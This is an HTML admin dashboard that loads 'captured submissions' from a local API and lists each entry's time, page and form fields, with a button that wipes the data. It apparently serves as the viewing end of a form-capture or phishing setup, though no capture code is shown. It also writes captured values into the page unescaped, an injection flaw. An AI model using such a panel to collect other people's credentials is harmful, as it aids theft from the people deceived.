<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Admin — Captured Data</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; background: #111; color: #e4e6eb; padding: 24px; }
    h1 { margin-bottom: 16px; font-size: 22px; }
    .controls { margin-bottom: 16px; display: flex; gap: 10px; }
    .controls button { padding: 8px 16px; border: none; border-radius: 6px; cursor: pointer; font-size: 14px; font-weight: 600; }
    #refreshBtn { background: #0b57d0; color: #fff; }
    #clearBtn { background: #d32f2f; color: #fff; }
    table { width: 100%; border-collapse: collapse; }
    th, td { text-align: left; padding: 10px 12px; border-bottom: 1px solid #333; font-size: 14px; }
    th { background: #1a1a1a; color: #aaa; text-transform: uppercase; font-size: 12px; letter-spacing: 0.5px; }
    tr:hover { background: #1a1a2e; }
    .empty { color: #666; padding: 40px; text-align: center; }
    .field-key { color: #888; }
    .field-val { color: #4fc3f7; }
  </style>
</head>
<body>
  <h1>📋 Captured Submissions</h1>
  <div class="controls">
    <button id="refreshBtn" onclick="load()">Refresh</button>
    <button id="clearBtn" onclick="clearAll()">Clear All</button>
  </div>
  <div id="content"></div>

  <script>
    async function load() {
      const res = await fetch('/api/data');
      const data = await res.json();
      const el = document.getElementById('content');

      if (!data.length) {
        el.innerHTML = '<p class="empty">No submissions yet.</p>';
        return;
      }

      let html = '<table><thead><tr><th>#</th><th>Time</th><th>Page</th><th>Captured Fields</th></tr></thead><tbody>';
      data.forEach((entry, i) => {
        const fields = entry.fields || {};
        const fieldStr = Object.entries(fields)
          .map(([k, v]) => `<span class="field-key">${k}:</span> <span class="field-val">${v}</span>`)
          .join(' &nbsp;|&nbsp; ');
        const time = entry.timestamp ? new Date(entry.timestamp).toLocaleString() : '—';
        html += `<tr><td>${i + 1}</td><td>${time}</td><td>${entry.page || '—'}</td><td>${fieldStr || '—'}</td></tr>`;
      });
      html += '</tbody></table>';
      el.innerHTML = html;
    }

    async function clearAll() {
      if (!confirm('Clear all captured data?')) return;
      await fetch('/api/clear');
      load();
    }

    load();
  </script>
</body>
</html>
